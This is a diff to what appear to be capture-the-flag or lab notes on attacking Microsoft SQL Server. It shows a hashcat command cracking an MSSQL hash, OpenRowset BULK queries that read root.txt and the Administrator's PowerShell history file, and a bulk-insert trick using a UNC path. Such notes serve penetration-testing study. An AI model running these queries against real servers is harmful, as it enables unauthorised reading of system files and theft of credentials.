@@ -79,7 +79,8 @@ hashcat -m 2000 mssql.hash ~/rockyou.txt -O
 ```sql
 select x from OpenRowset(BULK 'C:\Users\Administrator\Desktop\root.txt',SINGLE_CLOB) R(x)
 
-select x from OpenRowset(BULK 'C:\windows\win.ini',SINGLE_CLOB) R(x)
+select x from OpenRowset(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt',SINGLE_CLOB) R(x)
+
 
 create table #errortable (ignore int)
 bulk insert #errortable from '\\localhost\c$\windows\win.ini' with ( fieldterminator=',', rowterminator='\n', errorfile='c:\thatjusthappend.txt' )
